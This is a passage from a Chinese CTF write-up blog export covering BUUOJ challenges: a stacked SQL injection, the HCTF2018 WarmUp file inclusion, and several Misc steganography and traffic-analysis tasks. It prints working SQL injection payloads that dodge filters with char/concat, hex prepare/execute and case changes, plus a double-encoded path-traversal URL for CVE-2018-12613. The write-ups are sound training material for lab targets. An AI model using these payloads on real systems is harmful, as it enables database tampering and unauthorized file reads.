columnså¯ä»¥çœ‹åˆ°wordså’Œ1919810931114514è¡¨çš„ç»“æ„ã€‚wordsè¡¨çš„ç»“æ„ä¸ºï¼š 12345678910111213141516171819202122232425262728293031323334array(2) &#123; [0]&#x3D;&gt; string(1) &quot;1&quot; [1]&#x3D;&gt; string(7) &quot;hahahah&quot;&#125;array(6) &#123; [0]&#x3D;&gt; string(2) &quot;id&quot; [1]&#x3D;&gt; string(7) &quot;int(10)&quot; [2]&#x3D;&gt; string(2) &quot;NO&quot; [3]&#x3D;&gt; string(0) &quot;&quot; [4]&#x3D;&gt; NULL [5]&#x3D;&gt; string(0) &quot;&quot;&#125;array(6) &#123; [0]&#x3D;&gt; string(4) &quot;data&quot; [1]&#x3D;&gt; string(11) &quot;varchar(20)&quot; [2]&#x3D;&gt; string(2) &quot;NO&quot; [3]&#x3D;&gt; string(0) &quot;&quot; [4]&#x3D;&gt; NULL [5]&#x3D;&gt; string(0) &quot;&quot;&#125; é‚£ä¹ˆæˆ‘ä»¬è¦åšçš„äº‹æƒ…å¦‚ä¸‹ï¼š å°†wordsè¡¨æ¢æˆå…¶ä»–åå­—ï¼Œå°†1919810931114514è¡¨æ¢æˆwordsã€‚ å°†ç°åœ¨çš„wordsè¡¨çš„flagå­—æ®µæ”¹ä¸ºdataï¼Œå†åŠ ä¸€ä¸ªidå­—æ®µã€‚ å› æ­¤payloadä¸ºï¼š1';RENAME TABLE words TO words1;RENAME TABLE 1919810931114514 TO words;ALTER TABLE words CHANGE flag id VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#ã€‚ ç„¶åè®¿é—®1' or '1'='1ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰ç»™idèµ‹å€¼ï¼Œæ­£å¸¸æŸ¥è¯¢ä¼šå¤±è´¥ã€‚ EXECUTE æˆ–è€…ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨Executeæ‰§è¡Œå­˜å‚¨è¿‡ç¨‹ã€‚æˆ‘ä»¬åŸæœ¬è¦æ‰§è¡Œçš„SQLè¯­å¥æ˜¯select * from 1919810931114514 ï¼Œä½†æ˜¯ç”±äºä¸èƒ½å‡ºç°selectï¼Œæˆ‘ä»¬ä½¿ç”¨charå’Œconcatå‡½æ•°ç»•è¿‡ã€‚å³å°†ä¸Šè¿°SQLè¯­å¥å˜æˆï¼š concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(42),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96),char(32)) å› æ­¤æˆ‘ä»¬æäº¤ï¼š1';set @xx=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(42),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96),char(32));prepare abc from @xx;execute abc;# ç„¶åè¿”å›äº†ä¸ªstrstr($inject, \"set\") &amp;&amp; strstr($inject, \"prepare\")ï¼Œä½†æ˜¯éšä¾¿æ”¹ä¸€ä¸‹å¤§å°å†™å°±å¥½äº†ã€‚ æˆ–è€…ä¸ç”¨concatå’Œcharï¼Œç›´æ¥æŠŠSQLè¯­å¥16è¿›åˆ¶ç¼–ç ï¼Œå³1';SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;# flag{0a40da1f-849a-4110-bef2-2902426228d2}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"å †å æ³¨å…¥","slug":"å †å æ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"}]},{"title":"BUUOJåˆ·é¢˜-Web-HCTF-WarmUp","slug":"BUUOJåˆ·é¢˜-Web-HCTF-WarmUp","date":"2019-08-26T14:46:20.000Z","updated":"2019-12-10T12:15:12.600Z","comments":true,"path":"2019/08/26/BUUOJåˆ·é¢˜-Web-HCTF-WarmUp/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/26/BUUOJ%E5%88%B7%E9%A2%98-Web-HCTF-WarmUp/","excerpt":"HCTF2018-WarmUpã€‚","text":"HCTF2018-WarmUpã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; hint.phpæç¤ºflagåœ¨ffffllllaaaaggggæ–‡ä»¶ä¸‹ã€‚å¦‚æœfileå˜é‡æ˜¯stringï¼Œå¹¶ä¸”é€šè¿‡emmm:checkfile()çš„æ£€æµ‹å°±ä¼šinclude fileæ‰€æŒ‡æ–‡ä»¶ã€‚ ä»¤æˆ‘ä»¬æ„Ÿå…´è¶£çš„æ˜¯åœ¨checkfile()ä¸­åå¤å‡ºç°çš„$_page = mb_substr($_page,0, mb_strpos($_page . '?', '?');ï¼Œè¿™ä¸ªæ¶‰åŠåˆ°phpMyAdminçš„ä¸€ä¸ªæ´CVE-2018-12613ï¼Œç”±äºPHPä¼šè‡ªåŠ¨urldecodeä¸€æ¬¡ï¼Œå¯¼è‡´æˆ‘ä»¬æäº¤%253fï¼ˆ?çš„urlencodeçš„urlencodeï¼‰çš„æ—¶å€™è‡ªåŠ¨è½¬æˆ%3fï¼Œæ»¡è¶³ifæ¡ä»¶ï¼Œ%253f/å°±ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªç›®å½•ï¼Œä»è€Œincludeã€‚ æ‰€ä»¥æˆ‘ä»¬æäº¤http://c970312d-58ed-4287-8cec-92b882939661.node1.buuoj.cn/source.php?file=hint.php%253f/../../../../../../../ffffllllaaaaggggï¼Œå³å¯å¾—åˆ°flagã€‚ flag{f0156132-3213-4d53-99a2-1a46c5fb6142}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"mb_substr","slug":"mb-substr","permalink":"http://tiaonmmn.github.io/tags/mb-substr/"},{"name":"mb_strpos","slug":"mb-strpos","permalink":"http://tiaonmmn.github.io/tags/mb-strpos/"}]},{"title":"BUUOJåˆ·é¢˜-Misc","slug":"BUUOJåˆ·é¢˜-Misc","date":"2019-08-24T14:10:25.000Z","updated":"2020-03-06T13:08:56.742Z","comments":true,"path":"2019/08/24/BUUOJåˆ·é¢˜-Misc/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/24/BUUOJ%E5%88%B7%E9%A2%98-Misc/","excerpt":"å¼€å§‹åˆ·BUUOJçš„é¢˜äº†ã€‚ç•™ä¸ªæ—¥å¿—ã€‚ ç­¾åˆ° emmmmï¼Œæœ€åŸºæœ¬çš„ç­¾åˆ°æ ¼å¼ã€‚ç‚¹å‡»å°±é€ã€‚","text":"å¼€å§‹åˆ·BUUOJçš„é¢˜äº†ã€‚ç•™ä¸ªæ—¥å¿—ã€‚ ç­¾åˆ° emmmmï¼Œæœ€åŸºæœ¬çš„ç­¾åˆ°æ ¼å¼ã€‚ç‚¹å‡»å°±é€ã€‚ # äºŒç»´ç  æ‰“å¼€æ˜¯ä¸ªPNGäºŒç»´ç å›¾ç‰‡ã€‚æ‰«äº†å‘ç°æç¤ºâ€œSecret is hereâ€ï¼Œç„¶åæ‹–è¿›010 Editorï¼Œå‘ç°å›¾ç‰‡å°¾éƒ¨æœ‰PKå¤´ï¼Œæå‡ºæ¥æ˜¯ä¸ªZIPå‹ç¼©åŒ…ã€‚æ–‡ä»¶åä¸º4number.txtï¼Œç„¶ååŠ å¯†ã€‚çŒœæµ‹ä¸€ä¸‹ï¼Œå‹ç¼©åŒ…è¢«4ä½æ•°å­—çš„å¯†ç åŠ å¯†ï¼ŒZiprelloç ´è§£å°±å¥½äº†ã€‚7639ã€‚ é‡‘ä¸‰èƒ– æ‰“å¼€æ˜¯ä¸ªGIFåŠ¨æ€å›¾ã€‚Stegsolveæ‰“å¼€GIFï¼Œä¸€å…±89å¸§ï¼Œç¬¬21ã€51å’Œ79å¸§æœ‰ä¸‰å¼ flagå›¾ç‰‡ã€‚ Nç§æ–¹æ³•è§£å†³ ç»™äº†ä¸ªKEY.EXEï¼Œ010 Editoræ‰“å¼€å‘ç°æ˜¯ä¸ªJPEGå›¾ç‰‡çš„Base64ç¼–ç ã€‚ç›´æ¥æŠŠå¸¦ä¸Šdata:image/jpgçš„å­—ç¬¦ä¸²ä¸¢åˆ°æµè§ˆå™¨æ ï¼Œç›´æ¥å‡ºå›¾ç‰‡ï¼Œæ‰«ä¸€ä¸‹å°±å¥½äº†ã€‚ å¤§ç™½ ç»™äº†ä¸ªPNGå›¾ç‰‡ï¼Œ147KBï¼Œç„¶è€Œåªæœ‰679*256å¤§å°ï¼Œå°ºå¯¸ä¸å¤ªå¯¹ã€‚è€Œä¸”åœ¨XnViewé‚£é‡Œæ‰“ä¸å¼€ï¼Œæ„å‘³ç€å›¾ç‰‡æ ¼å¼æœ‰é”™è¯¯ã€‚æ‹–è¿›010 Editoré‚£é‡Œï¼ŒCRCé‚£é‡Œé”™äº†ï¼ŒçŒœæµ‹æ˜¯å›¾ç‰‡å®é™…å°ºå¯¸é‚£é‡Œè¢«ä¿®æ”¹äº†ï¼ŒæŠŠé«˜æ”¹å¤§ä¸€ç‚¹ï¼Œå°±å¯ä»¥äº†ã€‚ åé—¨æŸ¥æ€ï¼ˆWebshellåé—¨ï¼‰ ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼Œå‘ç°æ˜¯ç½‘ç«™æºç ã€‚ç”¨Dç›¾æ‰«ä¸€ä¸‹å°±å‡ºæ¥äº†ï¼Œinclude/include.phpæ˜¯ä¸€ä¸ªPHPSpyå¤§é©¬ï¼Œç¿»ä¸€ä¸‹å°±æœ‰ç™»å½•MD5ã€‚ FLAG ç»™äº†ä¸ªPNGï¼Œä¸¢åˆ°zstegé‡Œï¼Œå‘ç°LSBæœ‰Zipå‹ç¼©åŒ…ã€‚æå‡ºæ¥å‘ç°æ˜¯ä¸ªELFæ–‡ä»¶ï¼Œæ‰§è¡Œç»™äº†flagã€‚ æˆ‘çˆ±Linux ç»™äº†ä¸ªPNGï¼Œæ‰“ä¸å¼€ï¼Œæ‹–åˆ°010é‡Œå‘ç°JFIFï¼ŒJPEGæ–‡ä»¶çš„æ ‡å¿—ï¼Œä½†æ˜¯PNGçš„å¤´ï¼Œé‚£å°±æ”¹è¿‡æ¥ï¼Œå‘ç°æ˜¯å¼ å›¾ç‰‡ï¼Œä¸çŸ¥é“ä»£è¡¨å•¥ã€‚æ–‡ä»¶å°¾éƒ¨ä¹Ÿæœ‰æœªçŸ¥æ•°æ®ã€‚Googleè¯†å›¾å‘ç°æ˜¯Monty Pythonï¼ŒPythonï¼Ÿï¼Ÿå¤§èƒ†çŒœä¸€ä¸‹æ˜¯Pythonçš„ç›¸å…³æ•°æ®ã€‚ç„¶åå‘ç°ï¼Œè¿™äº›æ•°æ®ä¼¼ä¹å…·æœ‰ç‰¹å®šè§„å¾‹ã€‚çŒœä¸€ä¸‹æ˜¯pickleã€‚pickle.loadå‘ç°ç¡®å®æ˜¯pickleæ•°æ®ã€‚é‚£å°±ä¸Šè„šæœ¬è§£äº†ã€‚ 123456789import picklelist1&#x3D;pickle.load(open(&#39;D:\\\\Onedrive\\\\Desktop\\\\noname1&#39;,&#39;rb&#39;))for list in list1: #print(list) temp&#x3D;[&#39; &#39;]*100 for item in list: #print(item) temp[item[0]]&#x3D;item[1] print(&quot;&quot;.join(temp)) ç„¶åå°±å¯ä»¥çœ‹å‡ºæ¥äº†ã€‚ èœåˆ€666 ç»™äº†ä¸ªæµé‡åŒ…ã€‚çœ‹é¢˜ç›®åè€ƒå¯Ÿä¸­å›½èœåˆ€ï¼Œä¸­å›½èœåˆ€æ¯æ¬¡é€šè®¯ä½¿ç”¨base64ç¼–ç ã€‚æ‰“å¼€åå‘ç°å¤§é‡HTTPæµé‡ï¼Œæˆ‘ä»¬base64è§£ç å°±å¥½äº†ã€‚åœ¨TCP Stream 7å’Œ9æœ‰å¼‚å¸¸ã€‚7çš„æ—¶å€™ä¼ äº†ä¸€ä¸ªå·¨å¤§çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬æå‡ºæ¥ï¼Œæ³¨æ„åˆ°æœ‰z1å’Œz2å‚æ•°ï¼Œz2å‚æ•°ä¼ é€’çš„æ˜¯16è¿›åˆ¶ç¼–ç ã€‚è½¬æˆæ–‡ä»¶åå‘ç°æ˜¯ä¸ªæœ‰æ–‡å­—çš„å›¾ç‰‡ã€‚Stream 9å‡ºç°äº†Zipå‹ç¼©åŒ…ï¼Œæå‡ºæ¥å‘ç°è¦å¯†ç ã€‚è¾“å…¥7æå‡ºæ¥çš„å›¾ç‰‡æ‰€ç»™çš„æ–‡å­—å³å¯è§£å‹ã€‚ å¼±å£ä»¤ ç»™äº†ä¸ªåŠ å¯†Zipï¼Œç„¶åå»ç”¨å¼±å£ä»¤è·‘ï¼Œæ²¡è·‘å‡ºæ¥ã€‚å‘ç°æœ‰æ³¨é‡Šï¼Œç©ºæ ¼ä¸Tabç¬¦åŒæ—¶ä½¿ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æŠŠç©ºæ ¼ä»£è¡¨.ï¼ŒTabä»£è¡¨-ï¼Œæ¢è¡Œä»£è¡¨ä¸­æ–­ï¼Œå°±ä¼šå¾—åˆ°æ‘©æ–¯ç”µç ã€‚.... . .-.. .-.. ----- ..-. --- .-. ..- -- ã€‚HELL0FORUMï¼Œè§£å‹åå¾—åˆ°PNGå›¾ç‰‡ã€‚LSBéšå†™ã€‚ç”¨cloacked-pixelæå–flagã€‚å¯†ç ä¸º123456ã€‚ è¢«å·èµ°çš„æ–‡ä»¶ ç»™äº†ä¸ªPcapngï¼Œæ‰“å¼€åå‘ç°æœ‰FTPæµé‡ï¼Œæå‡ºæ¥ï¼Œå‘ç°æœ‰å¯†ç ã€‚RARçˆ†ç ´å¾—5790ï¼Œæ‰“å¼€å°±æ˜¯Flagã€‚ LSB ç»™äº†ä¸ªPNGå›¾ç‰‡ã€‚Stegsolveæ‰“å¼€ï¼Œç„¶åData Extractionï¼Œå‹¾ä¸ŠR G Bçš„0ä½ï¼ŒLSBæ¨¡å¼ï¼Œå‘ç°æœ‰å¦å¤–ä¸€å¼ PNGå›¾ç‰‡ã€‚Save binåå‘ç°æ˜¯å¼ äºŒç»´ç ã€‚æ‰«ä¸€ä¸‹å°±èƒ½å¾—flagã€‚ åˆ·æ–°è¿‡çš„å›¾ç‰‡ è¿™ä¸ªæœ‰ç‚¹å‘ã€‚ã€‚ã€‚åˆ·æ–°æŒ‡çš„F5ï¼Œæœ‰ä¸€ä¸ªF5 Steganographyï¼Œè§£å¯†å‡ºæ¥ä¸ªZipï¼Œè¦å¯†ç ï¼Œbinwalkç›´æ¥å°±æå‡ºæ¥flagäº†ã€‚ åŸºç¡€ç ´è§£ John the ripperç”¨MASKæ¨¡å¼?d?d?d?dç›´æ¥è¿‡ï¼Œ2563 AutoKey ç»™äº†ä¸ªUSBæµé‡åŒ…ï¼Œå‘ç°Leftover Dataä¸º8å­—èŠ‚ï¼ŒçŒœæµ‹æ˜¯USBé”®ç›˜æ•°æ®ã€‚tsharkæå‡ºæ¥tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; capdata.txtã€‚ç„¶åå¯¹ç€USB HIDçš„è§„èŒƒè§£æ•°æ®ã€‚ 1234567891011121314151617181920212223import base64mappings = &#123; 0x04:&quot;A&quot;, 0x05:&quot;B&quot;, 0x06:&quot;C&quot;, 0x07:&quot;D&quot;, 0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(r&#x27;C:\\Users\\Tiaonmmn\\capdata.txt&#x27;)for line in keys.readlines(): print(len(line)) if line==&quot;\\n&quot; or line==&quot;\\r&quot; or len(line)!=17: continue #print(line) print(line[4:6]) nums.append(int(line[4:6],16))print(nums)result=&quot;&quot;for item in nums: try: result+=mappings[item] except: pass print(result)print(result) å¾—åˆ°AUTOKEY9'8888'0.DECIPHEER9'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ'0ï¼Œå…¶ä¸­[Del]æ˜¯æŒ‡Backspaceé”®çš„å‘å‰åˆ é™¤ï¼Œä¸æ˜¯Delé”®çš„å‘ååˆ é™¤ã€‚å› æ­¤æˆ‘ä»¬è¦è§£çš„å¯†æ–‡ä¸º\"MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ\"ï¼ŒAutokeyåŠ å¯†ã€‚Googleä¸€ä¸‹\"Autokey cipher brute force\"ï¼Œæœåˆ°äº†è¿™ç¯‡æ–‡ç« ï¼Œä¸‹é¢æœ‰çˆ†ç ´è„šæœ¬ï¼Œè¦é…åˆå…¶ä»–æ–‡ä»¶ï¼Œä¸€å¹¶æ”¾ä¸Šã€‚ç½‘ç«™ä¸Šçš„æ˜¯Python2ç‰ˆæœ¬ï¼Œæˆ‘ç»™æ”¹æˆ3ç‰ˆçš„äº†ã€‚ break_autokey.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from ngram_score import ngram_scorefrom pycipher import Autokeyimport refrom itertools import permutationsqgram = ngram_score(&#x27;quadgrams.txt&#x27;)trigram = ngram_score(&#x27;trigrams.txt&#x27;)ctext = &#x27;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ&#x27;ctext = re.sub(r&#x27;[^A-Z]&#x27;, &#x27;&#x27;, ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self, N=1000): self.store = [] self.N = N def add(self, item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self, k): return self.store[k] def __len__(self): return len(self.store)# initN = 100for KLEN in range(3, 20): rec = nbest(N) for i in permutations(&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;, 3): key = &#x27;&#x27;.join(i) + &#x27;A&#x27; * (KLEN - len(i)) pt = Autokey(key).decipher(ctext) score = 0 for j in range(0, len(ctext), KLEN): score += trigram.score(pt[j:j + 3]) rec.add((score, &#x27;&#x27;.join(i), pt[:30])) next_rec = nbest(N) for i in range(0, KLEN - 3): for k in range(N): for c in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;: key = rec[k][1] + c fullkey = key + &#x27;A&#x27; * (KLEN - len(key)) pt = Autokey(fullkey).decipher(ctext) score = 0 for j in range(0, len(ctext), KLEN): score += qgram.score(pt[j:j + len(key)]) next_rec.add((score, key, pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Autokey(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Autokey(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print(bestscore, &#x27;autokey, klen&#x27;, KLEN, &#x27;:&quot;&#x27; + bestkey + &#x27;&quot;,&#x27;, Autokey(bestkey).decipher(ctext)) ngram_score.py12345678910111213141516171819202122232425262728293031&#x27;&#x27;&#x27;Allows scoring of text using n-gram probabilities17/07/12&#x27;&#x27;&#x27;from math import log10class ngram_score(object): def __init__(self, ngramfile, sep=&#x27; &#x27;): &#x27;&#x27;&#x27; load a file containing ngrams and counts, calculate log probabilities &#x27;&#x27;&#x27; self.ngrams = &#123;&#125; for line in open(ngramfile).readlines(): key, count = line.split(sep) self.ngrams[key] = int(count) self.L = len(key) self.N = sum(self.ngrams.values()) # calculate log probabilities for key in list(self.ngrams.keys()): self.ngrams[key] = log10(float(self.ngrams[key]) / self.N) self.floor = log10(0.01 / self.N) def score(self, text): &#x27;&#x27;&#x27; compute the score of text &#x27;&#x27;&#x27; score = 0 ngrams = self.ngrams.__getitem__ for i in range(len(text) - self.L + 1): if text[i:i + self.L] in self.ngrams: score += ngrams(text[i:i + self.L]) else: score += self.floor return score ç›¸åº”çš„è‹±æ–‡quadgrams.txtå’Œtrigrams.txtã€‚è·‘ä¸€éä¼šå‘ç°klen=8æ—¶å‘ç°flag-674.9145695645551 autokey, klen 8 :\"FLAGHERE\", HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPFï¼Œæ‰€ä»¥flagæ˜¯flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}ã€‚ åé™„USB HIDè§„èŒƒï¼š Printer [ç»™äº†ä¸ªUSBæµé‡åŒ…ï¼Œæ‰“å¼€å‘ç°æœ‰BULK_OUTï¼Œé‚£å°±ä¸æ˜¯é”®ç›˜æˆ–è€…é¼ æ ‡äº†ã€‚æŒ‰ç…§åŒ…å¤§å°æ’åºï¼Œ476ã€674ã€675ä¸å¯¹åŠ²ï¼Œè¿™ä¸‰ä¸ªåŒ…å‡ºç°äº†æ˜æ–‡ã€‚åœ¨476åŒ…é‡Œçœ‹åˆ°äº†CLS:PRINTERï¼ŒçŒœæµ‹æ˜¯æ‰“å°æœºçš„æ•°æ®ã€‚æœä¸€ä¸‹æ˜¯ä»€ä¹ˆæŒ‡ä»¤é›†2MFG:4BARCODE;CMD:TSPL2;MDL:3B-363B;CLS:PRINTER;ã€‚å‘ç°åº”è¯¥æ˜¯BarTenderçš„4BARCODE Seagullæ‰“å°æœºï¼Œç´§æ¥ç€å°±çœ‹åˆ°äº†æŒ‡ä»¤é›†æ–‡æ¡£ã€‚TSPL/TSPL2è¯­è¨€ï¼Œé‡ç‚¹æ˜¯å‡ºç°çš„BARå’ŒBITMAPæŒ‡ä»¤ã€‚é‚£å°±Pythonç”»å›¾å§ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from PIL import Imageimg = Image.new(&quot;RGB&quot;, (1024, 1024), &quot;white&quot;)def drawbar(): commands = r&#x27;&#x27;&#x27;BAR 348, 439, 2, 96BAR 292, 535, 56, 2BAR 300, 495, 48, 2BAR 260, 447, 2, 88BAR 204, 447, 56, 2BAR 176, 447, 2, 96BAR 116, 455, 2, 82BAR 120, 479, 56, 2BAR 44, 535, 48, 2BAR 92, 455, 2, 80BAR 20, 455, 72, 2BAR 21, 455, 2, 40BAR 21, 495, 24, 2BAR 45, 479, 2, 16BAR 36, 479, 16, 2BAR 284, 391, 40, 2BAR 324, 343, 2, 48BAR 324, 287, 2, 32BAR 276, 287, 48, 2BAR 52, 311, 48, 2BAR 284, 239, 48, 2BAR 308, 183, 2, 56BAR 148, 239, 48, 2BAR 196, 191, 2, 48BAR 148, 191, 48, 2BAR 68, 191, 48, 2BAR 76, 151, 40, 2BAR 76, 119, 2, 32BAR 76, 55, 2, 32BAR 76, 55, 48, 2BAR 112, 535, 64, 2BAR 320, 343, 16, 2BAR 320, 319, 16, 2BAR 336, 319, 2, 24BAR 56, 120, 24, 2BAR 56, 87, 24, 2BAR 56, 88, 2, 32BAR 224, 247, 32, 2BAR 256, 215, 2, 32BAR 224, 215, 32, 2BAR 224, 184, 2, 32BAR 224, 191, 32, 2BAR 272, 311, 2, 56BAR 216, 367, 56, 2BAR 216, 319, 2, 48BAR 240, 318, 2, 49BAR 184, 351, 2, 16BAR 168, 351, 16, 2BAR 168, 311, 2, 40BAR 152, 351, 16, 2BAR 152, 351, 2, 16&#x27;&#x27;&#x27; for line in commands.splitlines(): line_data = line[3:].replace(&quot; &quot;, &quot;&quot;).split(&quot;,&quot;) x = int(line_data[0]) y = int(line_data[1]) width = int(line_data[2]) height = int(line_data[3]) for a in range(x + width, x, -1): for b in range(y + height, y, -1): img.putpixel((a, b), (255, 0, 0))def drawbarcode(): data1 = bin(int( &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFE3FFFE1FFFFFFFFFF807C03C603FC07C07E0007F7FF01F8067FF007FF803FC07C03FFF1FF1F04F8FF1FF1FFF1FFF3FFCFF1F27FC7F1FF3E1FF1FF9FFFF1FF1FC1FCFF8FF1FFF1FFF3FFEFE3F87F8FF9FEFF8FF1FF9FFFF8FF1FC3FC7FCFF1FFF1FFF1FFEFC7FC7F9FF8FDFFC7F1FF9FFFF8FF1FC7FE3FC7F1FFF1FFF1FFEFCFFE7F1FF8F9FFC3F1FF9FFFFC7F1FC7FE3FE3F1FFF1FFF0FFEF8FFE7F1FF0FBFFE3F1FF9FFFFC7F1FC7FE3FE3F1FFF1FFF0FFEF8FFE7E1FF8F3FFE3F1FF9FFFFE3F1FC7FE3FF1F1FFF1FFF47FEF8FFE7E3FF9F7FFE1F1FF9FFFFE3F1FC7FF3FF8E1FFF1FFF47FEF9FFE7E3FFFFFFFF1F1FF9FFFFF1F1FC7FF3FF8C1FFF1FFF63FEF9FFE7F1FFFFFFFF1F1FF9FFFFF1F1FC7FF3FFC11FFF1FFF63FEF9FFE7F1FFFFFFFF1F1FF9FFFFF1F1FC7FE3FFE31FFF1FFF71FEF9FFE7F1FFFFFFFF1F1FF9FFFFF8F1FC7FE3FFE71FFF1FFF71FEF8FFE7F8FFFFFFFF0F1FF9FFFFF8F1FC7FE3FFCF1FFF1FFF78FEF8FFE7FCFFFFFFFF0F1FF9FFFFFC61FC7FE7FF9F1FFF1FFF78FEF8FFC7FE3FFFFFFF0F1FF9FFFFFC41FC7FC7